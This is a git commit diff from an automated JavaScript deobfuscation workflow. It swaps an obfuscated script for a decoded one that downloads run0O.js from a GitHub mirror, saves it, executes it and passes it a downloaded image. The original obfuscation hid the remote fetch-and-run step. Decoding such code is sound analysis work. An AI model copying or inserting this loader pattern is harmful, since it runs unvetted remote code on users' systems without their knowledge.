195ae9c1e48998f0f4aec6fcc5d366cf09a6aa7d
action <action@github.com>
2024-06-29 17:00:44 +0000

    Add decoded output file

--- output.js
+++ output.js
@@ -1,133 +1,28 @@
-//Sat Jun 29 2024 16:59:13 GMT+0000 (Coordinated Universal Time)
+//Sat Jun 29 2024 17:00:44 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-var _0xodJ = "jsjiami.com.v7";
-const _0x3e8c78 = _0x32b2;
-function _0x15b6() {
-  const _0x11d00 = function () {
-    return [...[_0xodJ, "CPKjsKjMiuaSUmelin.McCQomeM.xxKvk7gMEOgk==", "W4PRxSogeSkNWRS", "WPH9tSkXWROoWQqRrCobWOGTW4W", "ErfumdONW74Rwmkc", "tSkiWOBcJq", "WOHQWR/cHCklo28VWRRdQW", "W5ZcQWpcNJjQWRm", "WP4KzmoWWPRdG34VW43dRt7dO8kk", "tSkPW6P7C8ovE8kFW7JdOty", "AHGvWPBcLmk2WPldVSoAWRz1EYWQ", "WOZcVSkBD8o6W7JcUSkOrw88", "WPZdVmoIW4KGW7HBpWiVyqNdLW"], ...function () {
-      return [...["WPRdU8oHW4PIWRyTnc0R", "BCkqxSov", "WRyQWPRcRCkEW5SOW5dcNrXuWO/cUWi", "W4TCWQm4m8ooWQZcVH3cT3/cMZm", "WQJcP8oxWQq", "WP4fW48SWQ3dOCo5CmoiWO08oSo5", "lNNcJ8kuW5JcJmk+Fg5g", "uqxdTGvfW67cHG", "EIhcIG", "FmkqwmomlmolftVcGHBdNCowWPm", "WPBcPxRdPrTIkmkWyaOvWQHD", "WRhdJ1xdJSkZW4hcNmkyWOddVa", "W5NdLfJdHMiNWQ3dOmoEWRVdH8oF"], ...function () {
-        return ["EtT/fXWjW50", "WP/cUCkhjSomWRtcPCk9", "wSkzWP/cMedcVZ/dIa", "kLXpWP/dQCkVW43cUG", "orDXWR/dT8kZx8ocAmkhW6y+sG", "WONcLadcMYq", "WPZdT8oIW4OMW7SamGW0AXq", "nSopW6XMW4ldVCkIWQm", "x1NdQ8kNzszOWQy1WPzSWQbf", "ymkTpW", "WP4aW4iPWQNdOmo5wSooWQm9j8ov", "WOxcUmkDzSoWWQddOmoHtMm8W77cMrVcLSohcxpdPKqaW4idBmkNWPuQaqxdOSoWW5vDcCk3hfKXyCk2W7/dI2CCW6iNW7VcP8oOhMddG8k4Emk1be9YW6tcVmo0W5/dMhLLWQxcPLKsWRhcQZSysZBdOLxcH3RcSSoFzSkX"];
-      }()];
-    }()];
-  }();
-  _0x15b6 = function () {
-    return _0x11d00;
-  };
-  return _0x15b6();
-}
-function _0x32b2(_0x15dcf1, _0x473f57) {
-  const _0x5e6204 = _0x15b6();
-  return _0x32b2 = function (_0x23ba39, _0x25139f) {
-    _0x23ba39 = _0x23ba39 - 348;
-    let _0x19e793 = _0x5e6204[_0x23ba39];
-    if (_0x32b2.kwzZov === undefined) {
-      var _0x11943b = function (_0x5aff5a) {
-        const _0x43d9ee = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
-        let _0x5da4af = "",
-          _0x1459d4 = "";
-        for (let _0x2b5b51 = 0, _0x111017, _0x272a38, _0x4cf5c0 = 0; _0x272a38 = _0x5aff5a.charAt(_0x4cf5c0++); ~_0x272a38 && (_0x111017 = _0x2b5b51 % 4 ? _0x111017 * 64 + _0x272a38 : _0x272a38, _0x2b5b51++ % 4) ? _0x5da4af += String.fromCharCode(255 & _0x111017 >> (-2 * _0x2b5b51 & 6)) : 0) {
-          _0x272a38 = _0x43d9ee.indexOf(_0x272a38);
-        }
-        for (let _0x26e1e4 = 0, _0x1dc65f = _0x5da4af.length; _0x26e1e4 < _0x1dc65f; _0x26e1e4++) {
-          _0x1459d4 += "%" + ("00" + _0x5da4af.charCodeAt(_0x26e1e4).toString(16)).slice(-2);
-        }
-        return decodeURIComponent(_0x1459d4);
-      };
-      const _0x4bc70e = function (_0x2019c7, _0x4fd5b0) {
-        let _0x1f0bb3 = [],
-          _0x584e69 = 0,
-          _0x424ea4,
-          _0x51cd16 = "";
-        _0x2019c7 = _0x11943b(_0x2019c7);
-        let _0x5761b7;
-        for (_0x5761b7 = 0; _0x5761b7 < 256; _0x5761b7++) {
-          _0x1f0bb3[_0x5761b7] = _0x5761b7;
-        }
-        for (_0x5761b7 = 0; _0x5761b7 < 256; _0x5761b7++) {
-          _0x584e69 = (_0x584e69 + _0x1f0bb3[_0x5761b7] + _0x4fd5b0.charCodeAt(_0x5761b7 % _0x4fd5b0.length)) % 256;
-          _0x424ea4 = _0x1f0bb3[_0x5761b7];
-          _0x1f0bb3[_0x5761b7] = _0x1f0bb3[_0x584e69];
-          _0x1f0bb3[_0x584e69] = _0x424ea4;
-        }
-        _0x5761b7 = 0;
-        _0x584e69 = 0;
-        for (let _0x111783 = 0; _0x111783 < _0x2019c7.length; _0x111783++) {
-          _0x5761b7 = (_0x5761b7 + 1) % 256;
-          _0x584e69 = (_0x584e69 + _0x1f0bb3[_0x5761b7]) % 256;
-          _0x424ea4 = _0x1f0bb3[_0x5761b7];
-          _0x1f0bb3[_0x5761b7] = _0x1f0bb3[_0x584e69];
-          _0x1f0bb3[_0x584e69] = _0x424ea4;
-          _0x51cd16 += String.fromCharCode(_0x2019c7.charCodeAt(_0x111783) ^ _0x1f0bb3[(_0x1f0bb3[_0x5761b7] + _0x1f0bb3[_0x584e69]) % 256]);
-        }
-        return _0x51cd16;
-      };
-      _0x32b2.XeyZbn = _0x4bc70e;
-      _0x15dcf1 = arguments;
-      _0x32b2.kwzZov = true;
-    }
-    const _0x5a9717 = _0x5e6204[0],
-      _0x2605fc = _0x23ba39 + _0x5a9717,
-      _0x48469c = _0x15dcf1[_0x2605fc];
-    return !_0x48469c ? (_0x32b2.ateDlL === undefined && (_0x32b2.ateDlL = true), _0x19e793 = _0x32b2.XeyZbn(_0x19e793, _0x25139f), _0x15dcf1[_0x2605fc] = _0x19e793) : _0x19e793 = _0x48469c, _0x19e793;
-  }, _0x32b2(_0x15dcf1, _0x473f57);
-}
-((function (_0x295733, _0x42c907, _0x5b2bc3, _0x12560a, _0x2c43ba, _0x48534e, _0x25335f) {
-  return _0x295733 = _0x295733 >> 4, _0x48534e = "hs", _0x25335f = "hs", function (_0x2a1846, _0x2058e0, _0x4cb303, _0x580206, _0x57f6f4) {
-    const _0x5c1b48 = _0x32b2;
-    _0x580206 = "tfi";
-    _0x48534e = _0x580206 + _0x48534e;
-    _0x57f6f4 = "up";
-    _0x25335f += _0x57f6f4;
-    _0x48534e = _0x4cb303(_0x48534e);
-    _0x25335f = _0x4cb303(_0x25335f);
-    _0x4cb303 = 0;
-    const _0xae734c = _0x2a1846();
-    while (true && --_0x12560a + _0x2058e0) {
-      try {
-        _0x580206 = -parseInt(_0x5c1b48(361, "0Nqa")) / 1 * (-parseInt(_0x5c1b48(374, "ysuE")) / 2) + -parseInt(_0x5c1b48(366, "Qm*#")) / 3 + -parseInt(_0x5c1b48(359, "FvXP")) / 4 + -parseInt(_0x5c1b48(348, "^Ee)")) / 5 + parseInt(_0x5c1b48(349, "^Ee)")) / 6 * (-parseInt(_0x5c1b48(360, "qm^7")) / 7) + -parseInt(_0x5c1b48(356, "3Fhy")) / 8 * (-parseInt(_0x5c1b48(370, "fGIo")) / 9) + -parseInt(_0x5c1b48(369, "lxq!")) / 10 * (-parseInt(_0x5c1b48(351, "m3h(")) / 11);
-      } catch (_0x276710) {
-        _0x580206 = _0x4cb303;
-      } finally {
-        _0x57f6f4 = _0xae734c[_0x48534e]();
-        if (_0x295733 <= _0x12560a) _0x4cb303 ? _0x2c43ba ? _0x580206 = _0x57f6f4 : _0x2c43ba = _0x57f6f4 : _0x4cb303 = _0x57f6f4;else {
-          if (_0x4cb303 == _0x2c43ba.replace(/[PeSnKuEMlQxUCOkg=]/g, "")) {
-            if (_0x580206 === _0x2058e0) {
-              _0xae734c["un" + _0x48534e](_0x57f6f4);
-              break;
-            }
-            _0xae734c[_0x25335f](_0x57f6f4);
-          }
-        }
-      }
-    }
-  }(_0x5b2bc3, _0x42c907, function (_0x2658ec, _0x574105, _0x2bbe8e, _0x3fdaed, _0x5550fa, _0x2092a8, _0x58e001) {
-    return _0x574105 = "split", _0x2658ec = arguments[0], _0x2658ec = _0x2658ec[_0x574105](""), _0x2bbe8e = "reverse", _0x2658ec = _0x2658ec[_0x2bbe8e]("v"), _0x3fdaed = "join", (1526598, _0x2658ec[_0x3fdaed](""));
-  });
-})(3040, 374308, _0x15b6, 192), _0x15b6) && (_0xodJ = "¾1");
-const imageFileName = _0x3e8c78(364, "jmKC"),
+const imageFileName = "ppmt.png",
   fs = require("fs"),
-  axios = require(_0x3e8c78(367, "0Nqa")),
-  runFile = _0x3e8c78(378, "$[@a");
+  axios = require("axios"),
+  runFile = "./run0O.js";
 !(async () => {
-  const _0x373dbe = _0x3e8c78;
   let _0x59ffdc;
   try {
     _0x59ffdc = require(runFile);
   } catch (_0x2e5a5b) {
-    const _0x20e23c = await axios[_0x373dbe(371, "A$iY")]("https://mirror.ghproxy.com/https://raw.githubusercontent.com/smallfawn/script/main/" + _0x373dbe(365, "jH07"), {
-      "responseType": _0x373dbe(383, "Vk$h")
+    const _0x20e23c = await axios.get("https://mirror.ghproxy.com/https://raw.githubusercontent.com/smallfawn/script/main/run0O.js", {
+      "responseType": "arraybuffer"
     });
-    fs[_0x373dbe(352, "fd7]")](_0x373dbe(363, "Vk$h"), Buffer[_0x373dbe(353, "0ty5")](_0x20e23c.data));
+    fs.writeFileSync("run0O.js", Buffer.from(_0x20e23c.data));
     _0x59ffdc = require(runFile);
   }
   if (!fs.existsSync(imageFileName)) {
     console.log("AAA");
     try {
-      const _0x2530ec = await axios[_0x373dbe(357, "2Tfz")](_0x373dbe(373, "Vk$h") + imageFileName, {
-        "responseType": _0x373dbe(381, "iRf@")
+      const _0x2530ec = await axios.get("https://mirror.ghproxy.com/https://raw.githubusercontent.com/smallfawn/script/main/" + imageFileName, {
+        "responseType": "arraybuffer"
       });
-      fs[_0x373dbe(358, "t%PZ")](imageFileName, Buffer[_0x373dbe(350, "t%PZ")](_0x2530ec[_0x373dbe(377, "jmKC")]));
+      fs.writeFileSync(imageFileName, Buffer.from(_0x2530ec.data));
       await _0x59ffdc(imageFileName);
       return;
     } catch (_0x5f5727) {
